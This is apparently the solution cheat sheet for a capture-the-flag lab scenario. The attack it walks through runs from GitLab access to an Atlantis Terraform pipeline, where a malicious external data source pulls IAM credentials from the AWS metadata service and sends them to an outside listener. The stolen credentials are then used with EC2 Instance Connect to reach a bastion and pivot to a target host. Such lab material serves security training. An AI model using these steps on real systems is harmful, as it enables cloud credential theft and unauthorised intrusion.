### Scenario Solution: supply_chain_eic_pivot (CHEAT SHEET)

---

**WARNING: DO NOT READ THIS UNLESS YOU ARE STUCK. SPOILERS AHEAD!**

---

### Attack Path Walkthrough

#### **[ Phase 1: GitLab Entry & Reconnaissance ]**
1. **Login**: Use the credentials from `assets/gitlab_credentials.txt` to log in to the GitLab instance.
2. **Recon**: Browse the `infra-repo` and check the `atlantis.yaml` file.
3. **The Flaw**: Notice `autoplan.enabled: true`. This means any Merge Request (even from an unprivileged user) will trigger a `terraform plan` which can execute arbitrary code via Terraform data sources or provisioners.

#### **[ Phase 2: Pipeline Poisoning & Credential Theft ]**
1. **Exploit**: Add an `external` data source to `main.tf` that curls the AWS metadata service.
   ```hcl
   data "external" "steal_creds" {
     program = ["sh", "-c", "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/) | jq '.'"]
   }
   ```
2. **Exfiltrate**: Send the output to your listener (e.g., Burp Collaborator, Webhook.site).
3. **Result**: You now have `AccessKeyId`, `SecretAccessKey`, and `SessionToken` of the Atlantis Runner.

#### **[ Phase 3: Exploiting AWS API for Access ]**
1. **Configure**: Set up a new AWS profile using the stolen credentials.
2. **EIC Send Key**: Generate an SSH key (`ssh-keygen -t rsa -f mykey`) and push it to the Bastion Host.
   ```bash
   aws ec2-instance-connect send-ssh-public-key \
     --instance-id [BASTION_INSTANCE_ID] \
     --instance-os-user ubuntu \
     --ssh-public-key file://mykey.pub
   ```
3. **Access**: `ssh -i mykey ubuntu@[BASTION_PUBLIC_IP]`

#### **[ Phase 4: Lateral Movement ]**
1. **Discovery**: Run `ls -la /home/ubuntu/` on the Bastion. You will find `target-key.pem`.
2. **Pivoting**: Use this key to connect to the Target Server.
   ```bash
   ssh -i target-key.pem ubuntu@[TARGET_PRIVATE_IP]
   ```

#### **[ Phase 5: Capture the Flag ]**
1. **Success**: `cat /home/ubuntu/flag.txt`
